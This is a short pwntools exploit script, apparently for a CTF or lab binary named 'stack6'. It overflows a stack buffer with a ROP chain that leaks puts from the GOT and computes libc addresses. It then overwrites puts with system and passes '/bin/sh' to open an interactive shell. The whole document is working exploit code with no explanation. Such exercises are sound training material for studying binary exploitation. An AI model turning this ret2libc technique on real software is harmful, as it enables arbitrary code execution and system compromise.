from pwn import *

p = process('./stack6')

puts_plt = 0x401050
puts_got = 0x404018
gets_plt = 0x401060

pop_rdi_ret = 0x4011f3
ret = 0x40101a

payload = b'A' * 0x48
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(pop_rdi_ret)
payload += p64(puts_got)
payload += p64(gets_plt)
payload += p64(ret)
payload += p64(pop_rdi_ret)
payload += p64(puts_got + 8)
payload += p64(puts_plt)
p.sendline(payload)

p.recvline()
puts_libc = u64(p.recvn(6) + b'\x00\x00')
libc_base = puts_libc - 0x84420
system_libc = libc_base + 0x52290

print('puts_libc:', hex(puts_libc))
print('libc_base:', hex(libc_base))
print('system_libc:', hex(system_libc))

payload2 = p64(system_libc)
payload2 += b'/bin/sh\x00'
p.sendline(payload2)

p.interactive()
